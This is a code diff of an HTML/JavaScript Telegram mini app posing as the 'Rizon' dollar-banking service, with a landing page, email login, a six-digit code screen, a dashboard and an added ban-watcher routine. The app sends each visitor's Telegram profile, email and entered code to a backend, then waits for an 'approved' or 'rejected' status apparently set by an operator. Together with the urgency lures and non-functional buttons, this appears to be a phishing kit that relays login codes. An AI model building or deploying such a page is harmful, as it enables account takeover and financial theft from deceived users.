@@ -6,69 +6,33 @@
 <meta name="theme-color" content="#000000">
 <title>Rizon</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='black'/><text x='50' y='72' font-size='70' font-family='Arial' font-weight='900' fill='white' text-anchor='middle'>R</text></svg>">
-
-<!-- ⚡ Telegram SDK — deferred, non-blocking -->
 <script src="https://telegram.org/js/telegram-web-app.js" defer></script>
-
 <style>
-/* System font stack — loads instantly, looks native on iOS/Android */
 :root{
   --font:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
   --font-serif:Georgia,"Times New Roman",serif;
-
   --black:#000; --white:#fff; --gray:#8E8E93; --light:#F2F2F7;
   --border:#E5E5EA; --yellow:#FFE500; --blue:#0A84FF; --red:#E82127;
   --green:#34A853;
 }
 *{margin:0;padding:0;box-sizing:border-box;font-family:var(--font);-webkit-tap-highlight-color:transparent;}
 html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:none;}
-.screen{
-  position:fixed;inset:0;display:flex;flex-direction:column;
-  opacity:0;pointer-events:none;
-  overflow-y:auto;-webkit-overflow-scrolling:touch;
-  will-change:opacity;transform:translateZ(0);
-  transition:opacity .08s linear;
-}
+.screen{position:fixed;inset:0;display:flex;flex-direction:column;opacity:0;pointer-events:none;overflow-y:auto;-webkit-overflow-scrolling:touch;will-change:opacity;transform:translateZ(0);transition:opacity .08s linear;}
 .screen.active{opacity:1;pointer-events:auto;z-index:10;}
 .hidden{display:none!important;}
-
-/* ══════════ SPLASH ══════════ */
 #splash{background:#000;justify-content:center;align-items:center;}
 #splash h1{font-size:52px;font-weight:900;letter-spacing:6px;color:#fff;}
-
-/* ══════════ LANDING ══════════ */
 #landing{background:#000;position:relative;display:flex;flex-direction:column;overflow:hidden;}
-#landing .hero{
-  flex:1;min-height:0;position:relative;
-  background:radial-gradient(circle at 50% 45%, #1a1a1a 0%, #000 70%);
-  display:flex;flex-direction:column;justify-content:flex-start;
-  padding:40px 24px 0;overflow:hidden;
-}
+#landing .hero{flex:1;min-height:0;position:relative;background:radial-gradient(circle at 50% 45%, #1a1a1a 0%, #000 70%);display:flex;flex-direction:column;justify-content:flex-start;padding:40px 24px 0;overflow:hidden;}
 #landing .title-block{margin-top:20px;line-height:1;}
 #landing .title-block h1{font-size:42px;font-weight:800;color:#fff;letter-spacing:-1px;}
 #landing .title-block h1 em{font-family:var(--font-serif);font-style:italic;font-weight:600;}
-#landing .trust{
-  display:flex;align-items:center;gap:10px;margin-top:18px;
-  background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);
-  padding:10px 14px;border-radius:30px;width:fit-content;max-width:100%;
-}
+#landing .trust{display:flex;align-items:center;gap:10px;margin-top:18px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);padding:10px 14px;border-radius:30px;width:fit-content;max-width:100%;}
 #landing .flags{display:flex;font-size:16px;letter-spacing:-4px;}
 #landing .trust span{font-size:12px;color:#B0B0B0;font-weight:500;white-space:nowrap;}
 #landing .hero-art{flex:1;display:flex;justify-content:center;align-items:center;position:relative;margin-top:20px;min-height:0;}
-#landing .hero-art .phone{
-  width:58%;max-width:240px;aspect-ratio:9/17;
-  background:linear-gradient(145deg,#111,#000);
-  border:3px solid #1c1c1c;border-radius:32px;
-  box-shadow:0 30px 60px rgba(0,0,0,.7), inset 0 0 30px rgba(255,255,255,.02);
-  display:flex;align-items:center;justify-content:center;
-  font-size:70px;transform:rotate(-8deg);
-}
-#landing .hero-art .card{
-  position:absolute;top:12%;right:4%;width:38%;max-width:150px;aspect-ratio:1.6/1;
-  background:linear-gradient(135deg,#FFE500,#F5C400);border-radius:12px;transform:rotate(14deg);
-  box-shadow:0 20px 40px rgba(255,229,0,.25);padding:10px;color:#000;font-weight:800;
-  display:flex;flex-direction:column;justify-content:space-between;font-size:11px;
-}
+#landing .hero-art .phone{width:58%;max-width:240px;aspect-ratio:9/17;background:linear-gradient(145deg,#111,#000);border:3px solid #1c1c1c;border-radius:32px;box-shadow:0 30px 60px rgba(0,0,0,.7), inset 0 0 30px rgba(255,255,255,.02);display:flex;align-items:center;justify-content:center;font-size:70px;transform:rotate(-8deg);}
+#landing .hero-art .card{position:absolute;top:12%;right:4%;width:38%;max-width:150px;aspect-ratio:1.6/1;background:linear-gradient(135deg,#FFE500,#F5C400);border-radius:12px;transform:rotate(14deg);box-shadow:0 20px 40px rgba(255,229,0,.25);padding:10px;color:#000;font-weight:800;display:flex;flex-direction:column;justify-content:space-between;font-size:11px;}
 #landing .hero-art .card .brand{font-size:14px;letter-spacing:1px;}
 #landing .hero-art .card .visa{font-size:11px;text-align:right;font-weight:800;font-style:italic;}
 #landing .hero-art .chip{width:22px;height:16px;background:linear-gradient(135deg,#c9c9c9,#888);border-radius:3px;margin-top:4px;}
@@ -78,55 +42,31 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
 #landing .hero-art .nvda{top:38%;right:22%;background:linear-gradient(135deg,#76B900,#4a7a00);color:#000;font-size:11px;}
 #landing .hero-art .tsla{top:58%;right:14%;background:linear-gradient(135deg,#E82127,#a01418);color:#fff;font-size:18px;}
 #landing .hero-art .appl{top:20%;left:22%;background:linear-gradient(135deg,#2c2c2c,#000);color:#fff;font-size:20px;}
-#landing .actions{
-  flex-shrink:0;padding:16px 24px 34px;
-  display:flex;flex-direction:column;gap:12px;
-  background:linear-gradient(180deg, transparent 0%, #000 40%);
-  position:relative;z-index:2;
-}
+#landing .actions{flex-shrink:0;padding:16px 24px 34px;display:flex;flex-direction:column;gap:12px;background:linear-gradient(180deg, transparent 0%, #000 40%);position:relative;z-index:2;}
 #landing .btn{width:100%;padding:18px;border-radius:40px;font-size:16px;font-weight:600;text-align:center;border:none;cursor:pointer;transition:.15s;}
 #landing .btn-white{background:#fff;color:#000;}
 #landing .btn-white:active{background:#e5e5e5;}
 #landing .btn-outline{background:transparent;color:#fff;border:1.5px solid rgba(255,255,255,.35);}
 #landing .btn-outline:active{background:rgba(255,255,255,.08);}
-
-/* ══════════ LOGIN ══════════ */
 #login{background:var(--light);color:#000;padding:24px;justify-content:flex-start;}
 .back-row{display:flex;align-items:center;height:44px;margin-top:10px;}
 .back-arrow{font-size:26px;line-height:1;color:#000;cursor:pointer;padding:6px 8px;user-select:none;}
 #login h1.title{font-size:34px;font-weight:800;color:#000;margin-top:30px;letter-spacing:-.8px;line-height:1.1;}
 #login p.subtitle{font-size:16px;color:#5A5A5F;margin-top:12px;margin-bottom:32px;line-height:1.4;}
-.input-field{
-  width:100%;padding:22px 20px;border-radius:18px;
-  border:1.5px solid transparent;font-size:16px;outline:none;
-  background:#fff;transition:.15s;color:#000;
-  box-shadow:0 1px 2px rgba(0,0,0,.04);
-}
+.input-field{width:100%;padding:22px 20px;border-radius:18px;border:1.5px solid transparent;font-size:16px;outline:none;background:#fff;transition:.15s;color:#000;box-shadow:0 1px 2px rgba(0,0,0,.04);}
 .input-field::placeholder{color:#B0B0B5;}
 .input-field:focus{border-color:#000;}
-.btn-continue{
-  width:100%;padding:20px;border-radius:30px;font-size:16px;
-  font-weight:600;border:none;cursor:pointer;transition:.15s;margin-top:16px;
-  background:#8E8E93;color:#fff;
-}
+.btn-continue{width:100%;padding:20px;border-radius:30px;font-size:16px;font-weight:600;border:none;cursor:pointer;transition:.15s;margin-top:16px;background:#8E8E93;color:#fff;}
 .btn-continue.active{background:#000;color:#fff;}
 .btn-continue:not(.active){cursor:not-allowed;}
 #login .bottom-cta{margin-top:auto;padding-top:40px;padding-bottom:20px;text-align:center;font-size:15px;color:#3A3A3C;}
 #login .bottom-cta a{color:#000;font-weight:700;text-decoration:none;cursor:pointer;}
-
-/* ══════════ OTP ══════════ */
 #otp{background:var(--light);color:#000;padding:24px;justify-content:flex-start;}
 #otp h1.title{font-size:34px;font-weight:800;color:#000;margin-top:30px;letter-spacing:-.8px;line-height:1.15;}
 #otp p.subtitle{font-size:16px;color:#5A5A5F;margin-top:14px;margin-bottom:36px;line-height:1.45;}
 #otp p.subtitle b{color:#1a1a1a;font-weight:600;}
 .otp-row{display:flex;gap:10px;justify-content:space-between;margin-bottom:24px;}
-.otp-box{
-  flex:1;aspect-ratio:1/1.1;max-width:56px;
-  background:#fff;border:1.5px solid transparent;border-radius:16px;
-  box-shadow:0 1px 3px rgba(0,0,0,.06);
-  font-size:24px;font-weight:700;text-align:center;
-  color:#000;outline:none;transition:.15s;caret-color:#000;
-}
+.otp-box{flex:1;aspect-ratio:1/1.1;max-width:56px;background:#fff;border:1.5px solid transparent;border-radius:16px;box-shadow:0 1px 3px rgba(0,0,0,.06);font-size:24px;font-weight:700;text-align:center;color:#000;outline:none;transition:.15s;caret-color:#000;}
 .otp-box:focus{border-color:#000;}
 .otp-box.filled{border-color:#000;}
 .resend-text{margin-top:24px;text-align:left;font-size:15px;color:#5A5A5F;line-height:1.5;}
@@ -139,18 +79,12 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
 #otp-status.success{color:#0A7F2E;background:#E8F9EE;}
 .loader{border:3px solid #e0e0e0;border-top:3px solid #000;border-radius:50%;width:26px;height:26px;animation:spin .8s linear infinite;margin:30px auto;}
 @keyframes spin{to{transform:rotate(360deg);}}
-
-/* ══════════ DASHBOARD ══════════ */
 #dashboard{background:#E5E5EA;color:#000;padding:0;padding-bottom:90px;}
 .db-header{display:flex;justify-content:space-between;align-items:center;padding:20px 20px 10px;gap:10px;}
 .db-header .icon-btn{width:44px;height:44px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 2px 6px rgba(0,0,0,.06);cursor:pointer;}
 .db-header .right{display:flex;gap:10px;align-items:center;}
 .demo-badge{background:var(--yellow);color:#000;font-size:11px;padding:5px 10px;border-radius:20px;font-weight:800;letter-spacing:.5px;text-transform:uppercase;}
-.card-widget{
-  margin:8px 20px 0;background:linear-gradient(160deg,#1a1a1a 0%,#000 100%);
-  border-radius:24px;padding:26px 24px;color:#fff;position:relative;min-height:190px;
-  box-shadow:0 10px 30px rgba(0,0,0,.25);
-}
+.card-widget{margin:8px 20px 0;background:linear-gradient(160deg,#1a1a1a 0%,#000 100%);border-radius:24px;padding:26px 24px;color:#fff;position:relative;min-height:190px;box-shadow:0 10px 30px rgba(0,0,0,.25);}
 .card-widget .brand{font-size:20px;font-weight:900;letter-spacing:1px;}
 .card-widget .info{position:absolute;top:22px;right:22px;width:24px;height:24px;border:1.5px solid rgba(255,255,255,.5);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;color:rgba(255,255,255,.7);}
 .card-widget .label{font-size:13px;color:rgba(255,255,255,.6);margin-top:36px;}
@@ -182,8 +116,6 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
 .nav-item.active{color:#000;font-weight:700;}
 .nav-item .ic{font-size:22px;line-height:1;}
 .nav-center{width:52px;height:52px;background:#000;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:6px;box-shadow:0 6px 14px rgba(0,0,0,.25);flex-shrink:0;}
-
-/* ══════════ BANNED ══════════ */
 #banned{background:#0a0a0a;justify-content:center;align-items:center;padding:40px 24px;text-align:center;}
 #banned .icon{font-size:70px;margin-bottom:20px;}
 #banned h1{font-size:28px;font-weight:800;color:#E82127;margin-bottom:12px;}
@@ -193,10 +125,8 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
 </head>
 <body>
 
-<!-- SPLASH -->
 <div id="splash" class="screen active"><h1>RIZON</h1></div>
 
-<!-- BANNED -->
 <div id="banned" class="screen">
   <div class="icon">🚫</div>
   <h1>Access Denied</h1>
@@ -204,12 +134,9 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
   <div class="footer">Rizon © 2025</div>
 </div>
 
-<!-- LANDING -->
 <div id="landing" class="screen">
   <div class="hero">
-    <div class="title-block">
-      <h1>Dollar <em>banking</em><br>alternative.</h1>
-    </div>
+    <div class="title-block"><h1>Dollar <em>banking</em><br>alternative.</h1></div>
     <div class="trust">
       <div class="flags">🇺🇸🇪🇸🇫🇷🇩🇪🇮🇹🇬🇧🇨🇦</div>
       <span>Trusted by 600k+ users worldwide</span>
@@ -217,10 +144,7 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
     <div class="hero-art">
       <div class="phone">📱</div>
       <div class="card">
-        <div>
-          <div class="brand">RIZON</div>
-          <div class="chip"></div>
-        </div>
+        <div><div class="brand">RIZON</div><div class="chip"></div></div>
         <div class="visa">VISA<br><small style="font-size:9px;">Platinum</small></div>
       </div>
       <div class="token appl">🍎</div>
@@ -236,24 +160,19 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
   </div>
 </div>
 
-<!-- LOGIN -->
 <div id="login" class="screen">
   <div class="back-row"><span class="back-arrow" onclick="showScreen('landing')">←</span></div>
   <h1 class="title">Welcome back!</h1>
   <p class="subtitle">Enter your email to log in.</p>
   <input type="email" id="email-input" class="input-field" placeholder="example@email.com" autocomplete="email" inputmode="email">
   <button id="continue-btn" class="btn-continue" disabled onclick="submitEmail()">Continue</button>
-  <div class="bottom-cta">
-    Don't have an account? <a onclick="goSignup()">Sign up</a>
-  </div>
+  <div class="bottom-cta">Don't have an account? <a onclick="goSignup()">Sign up</a></div>
 </div>
 
-<!-- OTP -->
 <div id="otp" class="screen">
   <div class="back-row"><span class="back-arrow" onclick="backToEmail()">←</span></div>
   <h1 class="title">Enter verification<br>code</h1>
   <p class="subtitle">We sent a 6 digit code to<br><b id="otp-email">your email</b></p>
-
   <div class="otp-row" id="otp-row">
     <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="0" autocomplete="one-time-code">
     <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="1">
@@ -262,17 +181,11 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
     <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="4">
     <input class="otp-box" type="text" inputmode="numeric" maxlength="1" data-idx="5">
   </div>
-
-  <div class="resend-text">
-    Didn't receive code?
-    <span id="resend-link" class="link disabled">Resend in <span id="resend-secs">60</span> seconds</span>
-  </div>
-
+  <div class="resend-text">Didn't receive code? <span id="resend-link" class="link disabled">Resend in <span id="resend-secs">60</span> seconds</span></div>
   <div id="otp-status" class="hidden"></div>
   <div id="otp-loading" class="hidden"><div class="loader"></div></div>
 </div>
 
-<!-- DASHBOARD -->
 <div id="dashboard" class="screen">
   <div class="db-header">
     <div class="icon-btn" onclick="noop()">👤</div>
@@ -303,21 +216,9 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
       <div class="timer">⏱ <span id="countdown">00:58:25</span></div>
     </div>
     <div class="offer-steps">
-      <div class="step">
-        <div class="num">1</div><div class="step-icon">💳</div>
-        <div class="info"><h4>Get a Card with 78% off</h4><p>Start spending globally</p></div>
-        <button class="cta" onclick="noop()">Get card</button>
-      </div>
-      <div class="step">
-        <div class="num">2</div><div class="step-icon">🛡️</div>
-        <div class="info"><h4>Verify your account</h4><p>Finish KYC for full access</p></div>
-        <button class="cta disabled" onclick="noop()">Verify</button>
-      </div>
-      <div class="step">
-        <div class="num">3</div><div class="step-icon">💰</div>
-        <div class="info"><h4>Deposit &amp; start spending</h4><p>Add funds to your account</p></div>
-        <button class="cta disabled" onclick="noop()">Deposit</button>
-      </div>
+      <div class="step"><div class="num">1</div><div class="step-icon">💳</div><div class="info"><h4>Get a Card with 78% off</h4><p>Start spending globally</p></div><button class="cta" onclick="noop()">Get card</button></div>
+      <div class="step"><div class="num">2</div><div class="step-icon">🛡️</div><div class="info"><h4>Verify your account</h4><p>Finish KYC for full access</p></div><button class="cta disabled" onclick="noop()">Verify</button></div>
+      <div class="step"><div class="num">3</div><div class="step-icon">💰</div><div class="info"><h4>Deposit &amp; start spending</h4><p>Add funds to your account</p></div><button class="cta disabled" onclick="noop()">Deposit</button></div>
     </div>
   </div>
   <div class="bottom-nav">
@@ -330,9 +231,6 @@ html,body{height:100%;background:#000;color:#fff;overflow:hidden;font-synthesis:
 </div>
 
 <script>
-/* ═══════════════════════════════════════════════════════════
-   TELEGRAM WEBAPP
-   ═══════════════════════════════════════════════════════════ */
 let tg = window.Telegram?.WebApp;
 if (tg) { try { tg.expand(); tg.ready(); } catch(e){} }
 else { tg = { close: () => window.close(), ready: () => {} }; }
@@ -344,30 +242,19 @@ function getTGUser() {
     const u1 = window.Telegram?.WebApp?.initDataUnsafe?.user;
     if (u1 && u1.id) return u1;
     const raw = window.Telegram?.WebApp?.initData;
-    if (raw) {
-      const p = new URLSearchParams(raw);
-      const js = p.get("user");
-      if (js) return JSON.parse(js);
-    }
+    if (raw) { const p = new URLSearchParams(raw); const js = p.get("user"); if (js) return JSON.parse(js); }
     const hash = window.location.hash.slice(1);
     if (hash) {
       const hp = new URLSearchParams(hash);
       const tgData = hp.get("tgWebAppData");
-      if (tgData) {
-        const inner = new URLSearchParams(tgData);
-        const js = inner.get("user");
-        if (js) return JSON.parse(js);
-      }
+      if (tgData) { const inner = new URLSearchParams(tgData); const js = inner.get("user"); if (js) return JSON.parse(js); }
     }
-  } catch (e) { console.warn("getTGUser err:", e); }
+  } catch (e) {}
   return null;
 }
 
 let TG_USER = getTGUser();
 
-/* ═══════════════════════════════════════════════════════════
-   SCREEN NAV
-   ═══════════════════════════════════════════════════════════ */
 function showScreen(id) {
   const screens = document.querySelectorAll(".screen");
   for (let i = 0; i < screens.length; i++) screens[i].classList.remove("active");
@@ -375,14 +262,29 @@ function showScreen(id) {
   if (el) el.classList.add("active");
 }
 
-/* ═══════════════════════════════════════════════════════════
-   BOOT — show landing on first paint
-   ═══════════════════════════════════════════════════════════ */
-// Don't wait for window.load — kick off immediately
+/* ═══ BAN WATCHER — closes app if banned mid-session ═══ */
+let banWatcher = null;
+function startBanWatcher() {
+  if (!TG_USER || !TG_USER.id) return;
+  if (banWatcher) clearInterval(banWatcher);
+  banWatcher = setInterval(async () => {
+    try {
+      const res = await fetch(`${API_URL}/api/check-ban/${TG_USER.id}`);
+      const data = await res.json();
+      if (data.banned) {
+        clearInterval(banWatcher); banWatcher = null;
+        if (otpPoll) { clearInterval(otpPoll); otpPoll = null; }
+        if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
+        showScreen("banned");
+        setTimeout(() => { try { tg.close(); } catch(e){} }, 1200);
+      }
+    } catch (e) {}
+  }, 3000);
+}
+
+/* ═══ BOOT ═══ */
 (function boot() {
   if (!TG_USER) TG_USER = getTGUser();
-
-  // Send track-open in the background — never blocks UI
   if (TG_USER) {
     try {
       fetch(`${API_URL}/api/track-open`, {
@@ -393,46 +295,33 @@ function showScreen(id) {
       }).catch(() => {});
     } catch(e) {}
   }
-
-  // Show landing almost immediately (blink splash for realism)
   requestAnimationFrame(() => {
-    setTimeout(() => showScreen("landing"), 80);
+    setTimeout(() => {
+      showScreen("landing");
+      startBanWatcher();
+    }, 80);
   });
 })();
 
-/* ═══════════════════════════════════════════════════════════
-   LOGIN / SIGNUP
-   ═══════════════════════════════════════════════════════════ */
+/* ═══ LOGIN ═══ */
 const emailInput  = document.getElementById("email-input");
 const continueBtn = document.getElementById("continue-btn");
 
-function goLogin() {
-  resetLogin(); showScreen("login");
-  setTimeout(() => emailInput.focus(), 150);
-}
-function goSignup() {
-  resetLogin(); showScreen("login");
-  setTimeout(() => emailInput.focus(), 150);
-}
+function goLogin() { resetLogin(); showScreen("login"); setTimeout(() => emailInput.focus(), 150); }
+function goSignup() { resetLogin(); showScreen("login"); setTimeout(() => emailInput.focus(), 150); }
 function resetLogin() {
   emailInput.value = "";
   continueBtn.classList.remove("active");
   continueBtn.disabled = true;
   document.getElementById("otp-status").classList.add("hidden");
 }
-
 emailInput.addEventListener("input", () => {
   const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim());
   continueBtn.disabled = !ok;
   continueBtn.classList.toggle("active", ok);
 });
-emailInput.addEventListener("keydown", (e) => {
-  if (e.key === "Enter" && !continueBtn.disabled) submitEmail();
-});
+emailInput.addEventListener("keydown", (e) => { if (e.key === "Enter" && !continueBtn.disabled) submitEmail(); });
 
-/* ═══════════════════════════════════════════════════════════
-   SUBMIT EMAIL
-   ═══════════════════════════════════════════════════════════ */
 let currentSessionId = null;
 let currentEmail = "";
 
@@ -441,10 +330,8 @@ async function submitEmail() {
   if (!email) return;
   currentEmail = email;
   if (!TG_USER) TG_USER = getTGUser();
-
   continueBtn.disabled = true;
   continueBtn.textContent = "Please wait…";
-
   try {
     const res = await fetch(`${API_URL}/api/request-otp`, {
       method: "POST",
@@ -452,18 +339,14 @@ async function submitEmail() {
       body: JSON.stringify({ identifier: email, telegram_user: TG_USER })
     });
     const data = await res.json();
-
     if (res.status === 403) { showScreen("banned"); return; }
     if (data.session_id) {
       currentSessionId = data.session_id;
       document.getElementById("otp-email").textContent = email;
       openOtpScreen();
-    } else {
-      throw new Error(data.error || "Failed to send code");
-    }
-  } catch (err) {
-    alert(err.message || "Network error");
-  } finally {
+    } else { throw new Error(data.error || "Failed to send code"); }
+  } catch (err) { alert(err.message || "Network error"); }
+  finally {
     continueBtn.textContent = "Continue";
     continueBtn.classList.add("active");
     continueBtn.disabled = false;
@@ -476,9 +359,7 @@ function backToEmail() {
   showScreen("login");
 }
 
-/* ═══════════════════════════════════════════════════════════
-   OTP SCREEN
-   ═══════════════════════════════════════════════════════════ */
+/* ═══ OTP ═══ */
 const otpBoxes = [...document.querySelectorAll(".otp-box")];
 const otpStatus = document.getElementById("otp-status");
 const otpLoading = document.getElementById("otp-loading");
@@ -530,18 +411,11 @@ otpBoxes.forEach((box, i) => {
 });
 
 function getOtp() { return otpBoxes.map(b => b.value).join(""); }
-
 function maybeAutoSubmit() {
   const otp = getOtp();
-  if (otp.length === 6 && !otpSubmitted) {
-    otpSubmitted = true;
-    verifyOtp(otp);
-  }
+  if (otp.length === 6 && !otpSubmitted) { otpSubmitted = true; verifyOtp(otp); }
 }
 
-/* ═══════════════════════════════════════════════════════════
-   VERIFY OTP
-   ═══════════════════════════════════════════════════════════ */
 async function verifyOtp(otp) {
   otpLoading.classList.remove("hidden");
   otpStatus.classList.add("hidden");
@@ -572,9 +446,6 @@ function showOtpError(msg) {
   }, 800);
 }
 
-/* ═══════════════════════════════════════════════════════════
-   POLLING
-   ═══════════════════════════════════════════════════════════ */
 function startOtpPolling() {
   if (otpPoll) clearInterval(otpPoll);
   otpPoll = setInterval(async () => {
@@ -588,10 +459,7 @@ function startOtpPolling() {
         otpStatus.textContent = "✅ Login successful! Welcome to Rizon.";
         otpStatus.className = "success";
         otpStatus.classList.remove("hidden");
-        setTimeout(() => {
-          showScreen("dashboard");
-          startDashboardCountdown();
-        }, 1200);
+        setTimeout(() => { showScreen("dashboard"); startDashboardCountdown(); }, 1200);
       } else if (data.status === "rejected") {
         clearInterval(otpPoll); otpPoll = null;
         showOtpError("❌ OTP is not correct. Please try again.");
@@ -601,9 +469,6 @@ function startOtpPolling() {
   }, 2000);
 }
 
-/* ═══════════════════════════════════════════════════════════
-   RESEND
-   ═══════════════════════════════════════════════════════════ */
 function startResendCountdown(seconds) {
   const link = document.getElementById("resend-link");
   let t = seconds;
@@ -647,9 +512,6 @@ async function resendCode() {
   } catch (e) { alert("Network error"); }
 }
 
-/* ═══════════════════════════════════════════════════════════
-   DASHBOARD
-   ═══════════════════════════════════════════════════════════ */
 function noop() {}
 let dashCountdownStarted = false;
 function startDashboardCountdown() {
